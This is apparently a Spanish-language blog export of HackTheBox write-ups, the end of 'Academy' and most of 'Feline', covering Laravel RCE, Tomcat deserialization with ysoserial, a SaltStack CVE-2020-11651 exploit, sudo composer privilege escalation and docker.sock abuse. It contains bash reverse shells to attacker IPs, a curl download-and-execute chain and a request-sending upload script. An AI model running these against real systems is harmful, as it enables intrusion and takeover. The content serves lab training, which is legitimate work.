enfocado en una m√°quina de HackTheBox . _. ya que no quer√≠a usar metasploit y quer√≠a practicar su scripting :P Y tambi√©n en las im√°genes nos muestra como se debe usar, donde el API_KEY es el mismo que tenemos nosotros :I Y bueno, que se le hace, desear√≠a que hubiera sido mucho m√°s impl√≠cito, pero pues una vez lo vez, ya paila, a usarlo y seguir: Nos bajamos el script y su uso es sencillo: ‚Äì¬ª python3 pwn_laravel. py usage: pwn_laravel. py [-h] [-c COMMAND] [-m {1,2,3,4}] [-i] URL API_KEYpwn_laravel. py: error: the following arguments are required: URL, API_KEY‚Äì¬ª python3 pwn_laravel. py http://dev-staging-01. academy. htb/ dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= -c whoamiwww-dataBien, tenemos ejecuci√≥n de comandos en el sistema, intentemos generar una reverse Shell (: Listos, tamos dentro, hagamos de nuestra Shell una totalmente interactiva, ya que con la que tenemos estamos limitados, no podemos ver los comandos anteriormente ingresados, no podemos hacer CTRL + C, as√≠ que hagamos tratamiento de la TTY: www-data@academy:/var/www/html/htb-academy-dev-01/public$ script /dev/null -c bash# Ahora CTRL + Z (ac√° volvemos a nuestra m√°quina de atacante)# Escribimos lo siguiente:‚Äì¬ª stty raw -echo‚Äì¬ª fg (aunque no se vea cuando lo coloquemos, si se est√° escribiendo, damos enter)# Nos retornar√° a lo que ten√≠amos detenido, solo debemos escribir: reset‚Äì¬ª nc -lvp 4433        resetreset: unknown terminal type unknown# Y despu√©s: xtermTerminal type? xtermEn ejecuci√≥n se veria asi: Y por ultimo indicamos: www-data@academy:/var/www/html/htb-academy-dev-01/public$ export TERM=xtermwww-data@academy:/var/www/html/htb-academy-dev-01/public$ export SHELL=bashwww-data@academy:/var/www/html/htb-academy-dev-01/public$ stty rows 43 columns 192 (Esto es para contar con toda la pantalla, depende de la pantalla de cada uno, para verificar abran una terminal y escriban `stty -a`, ah√≠ salen las filas y columnas. El mejor ejemplo del uso de esto es corriendo `nano` antes de ejecutar esta l√≠nea) Ejecutamos la linea: En este recurso s4vitar lo explica en un video:  S4vitar explicando como hacer tratamiento de la TTY. Ahora si, sigamos: www-data@academy:/var/www/html/htb-academy-dev-01/public$ ls -la /home/total 32drwxr-xr-x 8 root   root   4096 Aug 10 00:34 . drwxr-xr-x 20 root   root   4096 Aug 7 12:07 . . drwxr-xr-x 2 21y4d  21y4d  4096 Aug 10 00:34 21y4ddrwxr-xr-x 2 ch4p   ch4p   4096 Aug 10 00:34 ch4pdrwxr-xr-x 6 cry0l1t3 cry0l1t3 4096 Jan 13 01:36 cry0l1t3drwxr-xr-x 3 egre55  egre55  4096 Aug 10 23:41 egre55drwxr-xr-x 2 g0blin  g0blin  4096 Aug 10 00:34 g0blindrwxr-xr-x 7 mrb3n  mrb3n  4096 Jan 13 01:25 mrb3nVarios usuarios en el sistema, vemos dos que han sido actualizados hace poco, cry0l1t3 y mrb3n. La bandera user. txt est√° en el usuario cry0l1t3, vemos como escalar a √©l‚Ä¶ Subiendo el script de enumeraci√≥n linpeas. sh a la m√°quina y ejecut√°ndolo conseguimos una contrase√±a: ‚Äì¬ª python3 -m http. serverServing HTTP on 0. 0. 0. 0 port 8000 (http://0. 0. 0. 0:8000/) . . . www-data@academy:/dev/shm$ wget http://10. 10. 14. 141:8000/linpeas. shwww-data@academy:/dev/shm$ chmod +x linpeas. shwww-data@academy:/dev/shm$ . /linpeas. sh. . . Tenemos en el archivo /var/www/html/academy/. env una contrase√±a. Pues, ya que estamos probemos con alguno de los usuarios a ver si se nos permite el login: www-data@academy:/dev/shm$ ls /home/21y4d ch4p cry0l1t3 egre55 g0blin mrb3nwww-data@academy:/dev/shm$ su 21y4dPassword: su: Authentication failurewww-data@academy:/dev/shm$ su ch4pPassword: su: Authentication failurewww-data@academy:/dev/shm$ su cry0l1t3Password: $ iduid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)$ Perfectoo, ahora‚Ä¶ A seguir enumerando. $ script /dev/null -c bashScript started, file is /dev/nullcry0l1t3@academy:/dev/shm$ ‚Ä¶ Escalada de privilegios #: El usuario cry0l1t3 est√° asignado al grupo adm que en pocas palabras permite ver los archivos /var/log/* de la m√°quina. Veamos si eso es algo importante, corramos de nuevo el script linpeas. sh a ver si obtenemos algo nuevo con base en los archivos log.  Info sobre el grupo adm y otros.  Group adm is used for system monitoring tasks. Members of this group can read many log files in /var/log, and can use xconsole. wiki. debian. org/SystemGroups Corriendo linpeas. sh no obtenemos nada nuevo, buscando por internet como aprovecharnos de los archivos log di con este art√≠culo:  Logging password on linux - redsiege. com. El cual habla de como los usuarios que efect√∫an su/sudo en el sistema, dejan sus credenciales grabadas en el archivo /var/log/audit/audit. log  You can view the audit log with aureport --tty. Si lo ejecutamos, tenemos: cry0l1t3@academy:/dev/shm$ aureport --ttyTTY Report===============================================# date time event auid term sess comm data===============================================Error opening config file (Permission denied)NOTE - using built-in logs: /var/log/audit/audit. log1. 08/12/2020 02:28:10 83 0 ? 1 sh  su mrb3n ,&lt;nl&gt;2. 08/12/2020 02:28:13 84 0 ? 1 su  mrb3n_Ac@d3my! ,&lt;nl&gt;3. 08/12/2020 02:28:24 89 0 ? 1 sh  whoami ,&lt;nl&gt;4. 08/12/2020 02:28:28 90 0 ? 1 sh  exit ,&lt;nl&gt;5. 08/12/2020 02:28:37 93 0 ? 1 sh  /bin/bash -i ,&lt;nl&gt;. . . . . . Bien, obtenemos unas posibles credenciales del usuario mrb3n, validemoslas: cry0l1t3@academy:/dev/shm$ su mrb3nPassword: $ iduid=1001(mrb3n) gid=1001(mrb3n) groups=1001(mrb3n)$ Nice, pues veamos para qu√© queremos ser el usuario mrb3n en el sistema‚Ä¶ Despu√©s de enumerar y no enumerar lo b√°sico :P encontramos esto: $ script /dev/null -c bashScript started, file is /dev/nullmrb3n@academy:/dev/shm$ sudo -l[sudo] password for mrb3n: Matching Defaults entries for mrb3n on academy:  env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser mrb3n may run the following commands on academy:  (ALL) /usr/bin/composermrb3n@academy:/dev/shm$ Nos indica que podemos ejecutar /usr/bin/composer con permisos de administrador indic√°ndole sudo al inicio, pues busquemos como podemos explotar ese binario‚Ä¶ Si nos vamos al siempre confiable GTFOBins (que tiene un gran compilado de binarios que pueden ser usados para saltarse algunos m√©todos de seguridad en el sistema), encontramos composer y una manera de obtener una Shell en el sistema:  GTFOBins exploiting composer bin - gtfobins. github. io/composer. En la m√°quina escribimos: mrb3n@academy:/dev/shm$ TF=$(mktemp -d)mrb3n@academy:/dev/shm$ echo '{ scripts :{ x : /bin/sh -i 0&lt;&amp;3 1&gt;&amp;3 2&gt;&amp;3 }}' &gt;$TF/composer. jsonmrb3n@academy:/dev/shm$ sudo /usr/bin/composer --working-dir=$TF run-script xPHP Warning: PHP Startup: Unable to load dynamic library 'mysqli. so' (tried: /usr/lib/php/20190902/mysqli. so (/usr/lib/php/20190902/mysqli. so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli. so. so (/usr/lib/php/20190902/mysqli. so. so: cannot open shared object file: No such file or directory)) in Unknown on line 0PHP Warning: PHP Startup: Unable to load dynamic library 'pdo_mysql. so' (tried: /usr/lib/php/20190902/pdo_mysql. so (/usr/lib/php/20190902/pdo_mysql. so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql. so. so (/usr/lib/php/20190902/pdo_mysql. so. so: cannot open shared object file: No such file or directory)) in Unknown on line 0Do not run Composer as root/super user! See https://getcomposer. org/root for details&gt; /bin/sh -i 0&lt;&amp;3 1&gt;&amp;3 2&gt;&amp;3# iduid=0(root) gid=0(root) groups=0(root)#Listones, tenemos una Shell como root en el sistema, lo √∫nico que nos quedar√≠a ver serian las flags: ‚Ä¶ Y hemos terminado, siendo root podemos hacer lo que queramos :P Linda m√°quina, muy did√°ctica, su nombre (academy) esta de acuerdo con lo que toma, nos recuerda la implementaci√≥n de una buena sanitizaci√≥n HTML, el hacer un buen research con base en lo que tenemos (errores y rutas), enumeraci√≥n de archivos, probar contrase√±as que probablemente no ‚Äúdeban‚Äù estar relacionadas, pero que si tenemos en cuenta que somos personas muchas veces olvidadizas o perezosas, asignamos la misma contrase√±a para varios servicios‚Ä¶ Tambi√©n nos muestra la importancia de los archivos log (y lo peligrosos) y finalmente el cl√°sico, ver si podemos ejecutar alg√∫n recurso con permisos de administrador (: Linda m√°quina, muchas gracias por leer y como siempre, a seguir rompiendo todo (: "
    }, {
    "id": 61,
    "url": "http://localhost:4000/htb/feline",
    "title": "HackTheBox - Feline",
    "body": "2021/02/20 - M√°quina Linux nivel dif√≠cil. Beleza irm√£o! De cabezota nos encontraremos con serializaci√≥n de objetos, enumeraremos y enumeraremos. Jugamos con los servicios que est√° corriendo Docker localmente y explotamos SaltStack. Pivotearemos entre containers rompiendo el demonio Docker. sock TL;DR (Spanish writeup): Creadores: MinatoTW &amp; MrR3boot. Holas, ¬øc√≥mo est√°n? Bueno, empezaremos jugando con deserializaci√≥n/serializaci√≥n de objetos . JSP, directamente obtendremos una Shell como el usuario tomcat en el sistema‚Ä¶ Enumerando los procesos activos encontraremos sobre el puerto 4506 del localhost el servicio SaltStack. Estar√° corriendo en un contenedor de Docker. Jugaremos con Remote Port Forwarding, despu√©s usaremos un exploit que nos permite ejecutar una reverse Shell para posicionarnos en la ra√≠z del contenedor como el usuario root. Curiosamente el archivo . bash_history va a tener contenido, lo que nos permita percatarnos del demonio que tiene dentro el sistema (son√≥ ch√©vere :P), docker. sock. Usaremos los privilegios que tiene el daemon para obtener una Shell en un contenedor que crearemos, pero que al mismo tiempo nos creara una montura de toda la ra√≠z del sistema. Clasificaci√≥n de la m√°quina. : Va pa la realidad, cero juegos eh!  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo plasmar lo que hice. ‚Ä¶  Enumeraci√≥n.  Explotaci√≥n.  Escalada de privilegios. ‚Ä¶ Enumeraci√≥n #: Como siempre empezamos realizando un escaneo de puertos sobre la maquina para saber que servicios esta corriendo. ‚Äì¬ª nmap -p- --open -v 10. 10. 10. 205 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n de S4vitar que me extrae los puertos en la clipboard   ‚Äì¬ª cat initScan # Nmap 7. 80 scan initiated Wed Dec 16 25:25:25 2020 as: nmap -p- --open -v -oG initScan 10. 10. 10. 205# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 205 ()  Status: UpHost: 10. 10. 10. 205 ()  Ports: 22/open/tcp//ssh///, 8080/open/tcp//http-proxy///# Nmap done at Wed Dec 16 25:25:25 2020 -- 1 IP address (1 host up) scanned in 161. 07 secondsMuy bien, ¬øque tenemos?       Puerto   Descripci√≥n         22   SSH: Conexion remota segura mediante una shell       8080   HTTP Proxy: Intermediario en las peticiones de recursos que realiza un cliente a un servidor   Hagamos nuestro escaneo de scripts y versiones en base a cada puerto, con ello obtenemos informacion mas detallada de cada servicio: ‚Äì¬ª nmap -p 22,8080 -sC -sV 10. 10. 10. 205 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   ‚Äì¬ª cat portScan # Nmap 7. 80 scan initiated Wed Dec 16 25:25:25 2020 as: nmap -p 22,8080 -sC -sV -oN portScan 10. 10. 10. 205Nmap scan report for 10. 10. 10. 205Host is up (0. 19s latency). PORT   STATE SERVICE VERSION22/tcp  open ssh   OpenSSH 8. 2p1 Ubuntu 4 (Ubuntu Linux; protocol 2. 0)8080/tcp open http  Apache Tomcat 9. 0. 27|_http-title: VirusBucketService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Wed Dec 16 25:25:25 2020 -- 1 IP address (1 host up) scanned in 19. 65 secondsTenemos:       Puerto   Servicio   Versi√≥n         22   SSH   OpenSSH 8. 2p1 Ubuntu 4       8080   HTTP   Apache Tomcat 9. 0. 27   ‚Ä¶ Puerto 8080 ‚åñ: El √∫nico recurso funcional es este: Lo cual nos permite subir un archivo, por medio de JSP (JavaServer Pages, es similar a PHP, pero es usado por Java). Si interceptamos por medio de BurpSuite la petici√≥n, vemos su estructura: Podemos modificar el contenido del archivo que subamos. Si subimos una imagen nos muestra este error: Vemos una ruta, posiblemente donde se est√©n guardando los archivos despu√©s de ser subidos‚Ä¶ Probando webshells, reverseshell, simples hello, etc. Y jugando con esa ruta no pod√≠a conseguir nada. Volviendo atr√°s para ver que ten√≠a encontre una vulnerabilidad que me llamo la atenci√≥n hacia Apache tomcat 9. 0. 27:  Remote Code Execution in Apache Tomcat - Deserialization Untrusted Data.  Apache Tomcat RCE by deserialization (CVE-2020-9484). B√°sicamente la serializaci√≥n de un objeto se basa en codificar el mismo para transmitirlo a trav√©s de una red, viajar√° como una serie de bytes o en un formato legible para el receptor. La serie de bytes o el formato pueden ser usados para crear un nuevo objeto que es id√©ntico en todo al original. Esto en resumidas palabras basado en la Wikipedia.  M√°s info sobre serializaci√≥n y deserializacion (PDF).  Aprende que es deserializaci√≥n. Indagando ya en que debemos tener para poder explotar esta vulnerabilidad, tenemos:  El atacante (nosotros) debe tener capacidad de subir un archivo con contenido arbitrario. Y conocer donde est√° siendo almacenado (probablemente lo sepamos).  Se debe tener habilitado el PersistentManager y que est√© usando FileStore‚Ä¶ (Ya hablaremos un poco de ello abajo).  Que existan ‚Äúgadgets‚Äù en el classpath que puedan ser usados para deserializar objetos. Bueno pues el primero lo cumplimos, el segundo y el tercero deber√≠amos probarlo. Y ver si en alg√∫n momento vemos algo. Hablemos de PersistentManager: Funciona como gestor de sesiones, sabiendo que estas sirven para mantener el estado entre peticiones de usuarios. Por default la configuraci√≥n cuenta con StandardManager, pero depende del admin cambiarlo a PersistentManager. StandardManager permite que las sesiones de usuario se guarden en la memoria, despu√©s de que tomcat sea cerrado pasara las sesiones al disco en un objeto serializado‚Ä¶ PersistentManager hace lo mismo, pero si una sesi√≥n ha estado suficiente tiempo inactiva la pasara al disco, esto para reducir el uso de memoria. Uno puede elegir como y donde quiere que las sesiones sean almacenadas:  FileStore: Se especifica una carpeta en el disco, ah√≠ se guardaran las sesiones dependiendo su ID.  JDBCStore: Se especifica una tabla en la base de datos, donde cada sesi√≥n se guarda por fila. La mayor√≠a de la info la pueden encontrar ac√°:  Apache Tomcat Deserialization - Redtimmy. com.  PersistentManager - apache. org.  Apache Tomcat Deserialization Untrusted Data - Medium. com/@romnenko. OJO‚Ä¶ Explotaci√≥n #: Perfecto, pues enumerando a√∫n m√°s encontr√© un PoC donde explica como subir varios objetos serializados para finalmente conseguir una reverse Shell:  Apache Tomcat Deserialization Untrusted Data - Medium. com/@romnenko. Los pasos que debemos seguir son sencillos y f√°ciles de entender:  Crear archivo bash donde tengamos la petici√≥n hacia nuestra m√°quina. (Para cuando se ejecute obtener la reverse Shell) Crear objetos serializados: Uno para subir el payload, otro para darle permisos y otro para ejecutarlo.  Ponernos en escucha :P Ejecutar las peticiones. D√©mosle: ‚Äì¬ª cat ejeje. sh #!/bin/bashbash -c  bash -i &gt;&amp; /dev/tcp/10. 10. 14. 152/4433 0&gt;&amp;1 Ahora creamos los objetos serializados, usaremos la misma herramienta que √©l, ysoserial. #Lo subimos a la maquina y lo guardamos en la ruta /tmp/ejeje. sh‚Äì¬ª java -jar ysoserial-master-6eca5bc740-1. jar CommonsCollections2 'curl http://10. 10. 14. 152:8000/ejeje. sh -o /tmp/ejeje. sh' &gt; downloadPayload. session#Le damos permisos totales‚Äì¬ª java -jar ysoserial-master-6eca5bc740-1. jar CommonsCollections2 'chmod 777 /tmp/ejeje. sh' &gt; chmodPayload. session#Ejecutamos‚Äì¬ª java -jar ysoserial-master-6eca5bc740-1. jar CommonsCollections2 'bash /tmp/ejeje. sh' &gt; executePayload. session‚Äì¬ª lschmodPayload. session downloadPayload. session ejeje. sh executePayload. session ysoserial-master-6eca5bc740-1. jarEl creador del post crea un script para hacer las peticiones, vamos a copiarnos pero cambiando algunas cositas: ‚Äì¬ª cat todotaskbro. sh #!/bin/bashemail= hola@hola. com route_upload= . . /. . /opt/tomcat/temp#route_upload= . . /. . /. . /opt/samples/uploads echo -e  \n\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ download +++++++++++++++++++++++++++++++++\n\n curl -X POST http://10. 10. 10. 205:8080/upload. jsp?email=$email -H  Cookie:JSESSIONID=$route_upload/downloadPayload  -F 'image=@downloadPayload. session'curl -X POST http://10. 10. 10. 205:8080/upload. jsp?email=$email -H  Cookie:JSESSIONID=$route_upload/downloadPayload sleep 1echo -e  \n\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ chmod +++++++++++++++++++++++++++++++++\n\n curl -X POST http://10. 10. 10. 205:8080/upload. jsp?email=$email -H  Cookie:JSESSIONID=$route_upload/chmodPayload  -F 'image=@chmodPayload. session'curl -X POST http://10. 10. 10. 205:8080/upload. jsp?email=$email -H  Cookie:JSESSIONID=$route_upload/chmodPayload sleep 1echo -e  \n\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ execute ++++++++++++++++++++++++++++++++++\n\n curl -X POST http://10. 10. 10. 205:8080/upload. jsp?email=$email -H  Cookie:JSESSIONID=$route_upload/executePayload  -F 'image=@executePayload. session'curl -X POST http://10. 10. 10. 205:8080/upload. jsp?email=$email -H  Cookie:JSESSIONID=$route_upload/executePayload El creador del post crea un script para hacer las peticiones, vamos a copiarnos pero cambiando algunas cositas:La forma de la petici√≥n coincide en varios √≠tems, solo modificaremos el header y la URL. √âl tiene como ruta donde se est√°n guardando las muestras a /opt/samples/uploads/. Nosotros obtuvimos una posible ruta cuando intentamos subir una imagen, podemos probar con esa y ver que obtenemos. Levantemos un servidor web r√°pidamente con Python, pong√°monos en escucha por medio de netcat y ejecutemos todotaskbro. sh: ‚Äì¬ª python3 -m http. serverServing HTTP on 0. 0. 0. 0 port 8000 (http://0. 0. 0. 0:8000/) . . . ‚Äì¬ª nc -nlvp 4433listening on [any] 4433 . . . Ahora si ejecutemos: Pues nos indica que se ha subido el archivo (pero no obtenemos peticiones en nuestro servidor de Python) pero cuando lo intenta ejecutar nos dice Invalid Request‚Ä¶ Probemos con la ruta que ten√≠a el script original: . . . route_upload= . . /. . /. . /opt/samples/uploads . . . Perfectooooooooooo, obtenemos nuestra Shell como el usuario tomcat‚Ä¶ Pero ¬øc√≥mo? Si claramente estamos viendo que la p√°gina nos respondi√≥ con errores. Bueno lo explica claramente el art√≠culo donde encontramos inicialmente la vulnerabilidad. Al momento de realizar la deserializacion de los objetos todo va correcto y ejecuta nuestro c√≥digo malicioso, el error se muestra cuando intenta interpretar los objetos como sesiones, que claramente no lo son. Pero pues en este punto como ya vimos, nuestro c√≥digo ya se hab√≠a ejecutado (: Lindo lindo, con este usuario tenemos acceso a la flag del user. txt. Haciendo un tratamiento de la TTY podemos obtener una Shell completamente interactiva, que nos permita autocompletar, evitar dar por error CTRL + C y quedarnos sin Shell y dem√°s beneficios.  S4vitar nos guia rapidamente (real, rapidamente). ‚Ä¶ Escalada de privilegios #: Enumerando y enumerando encontr√© algunas cosas interesantes; puertos locochones corriendo localmente: tomcat@VirusBucket:~$ netstat -lActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address      Foreign Address     Statetcp    0   0 localhost:4505     0. 0. 0. 0:*        LISTENtcp    0   0 localhost:4506     0. 0. 0. 0:*        LISTEN. . . tcp    0   0 localhost:8000     0. 0. 0. 0:*        LISTEN. . . Tenemos docker corriendo en la maquina: tomcat@VirusBucket:~$ ifconfig. . . docker0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500    inet 172. 17. 0. 1 netmask 255. 255. 0. 0 broadcast 172. 17. 255. 255    inet6 fe80::42:73ff:fe0d:a026 prefixlen 64 scopeid 0x20&lt;link&gt;    ether 02:42:73:0d:a0:26 txqueuelen 0 (Ethernet)    RX packets 1982 bytes 324390 (324. 3 KB)     RX errors 0 dropped 0 overruns 0 frame 0            TX packets 2320 bytes 257398 (257. 3 KB)     TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0. . . Revisemos el estado del servicio con systemctl: tomcat@VirusBucket:~$ systemctl status docker‚óè docker. service - Docker Application Container Engine   Loaded: loaded (/lib/systemd/system/docker. service; enabled; vendor preset: enabled)   Active: active (running) since Sat 2020-12-19 18:13:52 UTC; 8h agoTriggeredBy: ‚óè docker. socket    Docs: https://docs. docker. com  Main PID: 930   Tasks: 32   Memory: 122. 8M   CGroup: /system. slice/docker. service       ‚îú‚îÄ 930 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd. sock       ‚îú‚îÄ1288 /usr/bin/docker-proxy -proto tcp -host-ip 127. 0. 0. 1 -host-port 8000 -container-ip 172. 17. 0. 2 -container-port 8000       ‚îú‚îÄ1303 /usr/bin/docker-proxy -proto tcp -host-ip 127. 0. 0. 1 -host-port 4506 -container-ip 172. 17. 0. 2 -container-port 4506       ‚îî‚îÄ1320 /usr/bin/docker-proxy -proto tcp -host-ip 127. 0. 0. 1 -host-port 4505 -container-ip 172. 17. 0. 2 -container-port 4505Warning: some journal files were not opened due to insufficient permissions. Vemos los 3 puertos que encontramos antes, cada uno es un contenedor corriendo localmente‚Ä¶ Ac√° no cre√≠ en lo que hab√≠a encontrado inicialmente y me puse a sobre pensar las cosas, lo que me llevo a perder tiempo y ganarme un lindo RabbitHole, pero bueno, de eso se aprende: Al principio que vi los puertos 4505 y 4506 me fui de una para la web a buscar que significado ten√≠an esos puertos, pues los dos son manejados por el servicio SaltStack, que funciona como automatizado de eventos y tareas remotas, adem√°s de gestionar configuraciones, creado con Python.  Info del puerto 4505.  Info del puerto 4506. Pues al ver eso no le preste atenci√≥n y mientras que investigaba ya ten√≠a en mi cabeza hacer Remote Port Forwarding y ver si encontr√°bamos algo diferente mediante la web o con nmap: Pues tome cada puerto e hice el forwarding, enumere cada servicio en la web, intente netcat, telnet, escanee con nmap (que creo que si me sirvi√≥ de algo) yyyy queme tiempo pensando que podr√≠a ser o que no estaba viendo‚Ä¶ El Remote Port Forwarding lo realic√© con SSH, en el caso del puerto 8000 ser√≠a as√≠: tomcat@VirusBucket:~$ ssh -R 8000:127. 0. 0. 1:8000 root@10. 10. 14. 152 -p 177 Le indicamos que queremos que sea Remote (-R).  Tome el puerto 8000 que est√° sobre el localhost y lo monte en el puerto 8000 de m√≠ m√°quina.  Mi SSH lo tengo sobre el puerto 177. El escaneo de nmap indicaba:       Puerto   Descripci√≥n         8000   CherryPy wsgiserver 18. 6. 0       4505   ZeroMQ ZMTP 2. 0       4506   ZeroMQ ZMTP 2. 0   Busque vulnerabilidades sobre cada uno de ellos, pero no funcionaban o sencillamente no hab√≠a. Despu√©s del tiempo quemado, volv√≠a tras e hice el netstat -l de nuevo. Tome los puertos 4505 y 4506 y busque exploits hacia SaltStack, pues encontr√© 2 que se aprovechan de un modelo llamado master-slave, donde master es llamado salt master y slave se llama salt minions, entonces salt master es usado para enviar comandos y tareas (configuraciones) a los salt minions. En la vulnerabilidad, la funci√≥n ClearFuncs no v√°lida propiamente los metodos de llamado, ahi obtenemos una brecha que podemos aprovechar:  Articulo de TrendMicro explicando las vulnerabilidades. Una de las vulnerabilidades (CVE-2020-11652) nos permite ver archivos del sistema mediante un Directory Path Traversal. El otro (CVE-2020-11651) nos permite ejecuci√≥n remota de comandos mediante un bypass auth. Inclin√©monos por el segundo.  These can be exploited by remote, unauthenticated attackers, and all versions of SaltStack Salt before 2019. 2. 4 and 3000 before 3000. 2 are affected. TrendMicro En github tenemos dos PoC‚Äôs:  CVE-2020-11651 - Github/jasperla.  CVE-2020-11651 - Github/dozernz. Entonces lo primero que debemos hacer es hacer un Remote Port Forwarding de los dos puertos para ver cu√°l de los dos es vulnerable (o ninguno) :P (Pero pues s√≠, hay uno vulnerable porque o si no no hubiera escrito esto :P:P) En nuestra m√°quina validamos que tenemos sobre ese puerto: ‚Äì¬ª lsof -i:4505‚úó ‚Ä¢‚Ä¢‚Ä¢ bAd ‚Ä¢‚Ä¢‚Ä¢¬∑ ~/sec/htb/feline/exploit‚Äì¬ª Hacemos el forwarding: tomcat@VirusBucket:~$ ssh -R 4505:127. 0. 0. 1:4505 root@10. 10. 14. 152 -p 177Y volvemos a validar a ver si ya tenemos el servicio en nuestra maquina: ‚Äì¬ª lsof -i:4505COMMAND  PID USER  FD  TYPE DEVICE SIZE/OFF NODE NAMEsshd  164674 root  9u IPv6 839839   0t0 TCP localhost:4505 (LISTEN)sshd  164674 root  10u IPv4 839840   0t0 TCP localhost:4505 (LISTEN)La ejecuci√≥n de los exploits tambi√©n me llevo un poco entenderlo y b√°sicamente fue por no leer. En el GitHub de cada uno tienen: There's no interactivity implemented, youll need to catch a reverse shell. Asi que si o si debemos obtener una shell :P Pong√°monos en escucha por el puerto 4434 de una :P ‚Äì¬ª nc -nlvp 4434listening on [any] 4434 . . . Entonces, empecemos con el de jasperla a ver si obtenemos √©xito con este, su ejecuci√≥n es sencilla e intuitiva, adem√°s en el c√≥digo viene el puerto 4506 por defecto, pero pues probemos que pasa con el 4505. def main():  parser = argparse. ArgumentParser(description='Saltstack exploit for CVE-2020-11651 and CVE-2020-11652')  parser. add_argument('--master', '-m', dest='master_ip', default='127. 0. 0. 1')  parser. add_argument('--port', '-p', dest='master_port', default='4506')  parser. add_argument('--force', '-f', dest='force', default=False, action='store_false')  parser. add_argument('--debug', '-d', dest='debug', default=False, action='store_true')  parser. add_argument('--run-checks', '-c', dest='run_checks', default=False, action='store_true')  parser. add_argument('--read', '-r', dest='read_file')  parser. add_argument('--upload-src', dest='upload_src')  parser. add_argument('--upload-dest', dest='upload_dest')  parser. add_argument('--exec', dest='exec', help='Run a command on the master')  parser. add_argument('--exec-all', dest='exec_all', help='Run a command on all minions')  args = parser. parse_args()‚Äì¬ª python3 exploit. py --port 4505 --exec 'bash -c  bash -i &gt;&amp; /dev/tcp/10. 10. 14. 218/4434 0&gt;&amp;1 '[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort. [+] Checking salt-master (127. 0. 0. 1:4505) status. . . OFFLINE√âl offline quiere decir que intento hacer ping y no consigui√≥ respuesta, as√≠ que hagamos el forwarding pero con el puerto 4506, y ejecutemos: (Ni con nc ip port -e /bin/bash ni con la versi√≥n antigua de nc obtuve ninguna respuesta) Lindo lindo, obtenemos una shell sobre el contenedor del puerto 4506, hacemos tratamiento de la TTY yyyy vemos cositas interesantes:  Tenemos un archivo todo. txt.  Curioso que el archivo . bash_history tiene contenido. root@2d24bf61767c:~# cat todo. txt - Add saltstack support to auto-spawn sandbox dockers through events. - Integrate changes to tomcat and make the service open to public. root@2d24bf61767c:~# cat . bash_historypaswdpasswdpasswdpassswdpasswdpasswdcd /rootlsls -larm . wget-hstscd . ssh/lscd . . printf '- Add saltstack support to auto-spawn sandbox dockers. \n- Integrate changes to tomcat and make the service open to public. ' &gt; todo. txtcat todo. txtprintf -- '- Add saltstack support to auto-spawn sandbox dockers. \n- Integrate changes to tomcat and make the service open to public. ' &gt; todo. txtcat todo. txtprintf -- '- Add saltstack support to auto-spawn sandbox dockers. \n- Integrate changes to tomcat and make the service open to public. \' &gt; todo. txtprintf -- '- Add saltstack support to auto-spawn sandbox dockers. \n- Integrate changes to tomcat and make the service open to public. \n' &gt; todo. txtprintf -- '- Add saltstack support to auto-spawn sandbox dockers. \n- Integrate changes to tomcat and make the service open to public. \' &gt; todo. txtprintf -- '- Add saltstack support to auto-spawn sandbox dockers. \n- Integrate changes to tomcat and make the service open to public. \n' &gt; todo. txtcat todo. txtprintf -- '- Add saltstack support to auto-spawn sandbox dockers through events. \n- Integrate changes to tomcat and make the service open to public. \n' &gt; todo. txtcd /home/tomcatcat /etc/passwdexitcd /root/lscat todo. txt ls -la /var/run/curl -s --unix-socket /var/run/docker. sock http://localhost/images/jsonexitVemos en la √∫ltima l√≠nea algo curioso, /var/run/docker. sock. Antes de cualquier cosa, entendamos que hace ese archivo:  Communicate with the Docker daemon from within a container. Medium. com/better-programming Como se explica en el post anterior, se basa en un demonio, el cual queda escuchando mediante el archivo docker. sock, principalmente es el punto de entrada para usar Docker API, lo que nos permite comunicarnos hacia el host (contenedor) principal. Mediante √©l podemos crear contenedores, inspeccionarlos, borrarlos, enviar peticiones y tambi√©n enviar comandos (: M√°s info:  About /var/run/docker. sock - Medium/better-programming.  Can anyone explain docker. sock - Stackoverflow.  Daemon socket option - Docs. docker.  By default, a unix domain socket (or IPC socket) is created at /var/run/docker. sock, requiring either root permission, or docker group membership. Lo que quiere decir que estamos ejecutando peticiones como usuario administrador del contenedor. ‚Ä¶ Con esto en mente y entendiendo que hace, pues retomemos lo que encontramos en el archivo . bash_history: root@2d24bf61767c:~# curl -s --unix-socket /var/run/docker. sock http://localhost/images/json[  {    Containers :-1,    Created :1590787186,    Id : sha256:a24bb4013296f61e89ba57005a7b3e52274d8edd3ae2077d04395f806b63d83e ,    Labels :null,    ParentId :  ,    RepoDigests :null,    RepoTags :[      sandbox:latest    ],    SharedSize :-1,    Size :5574537,    VirtualSize 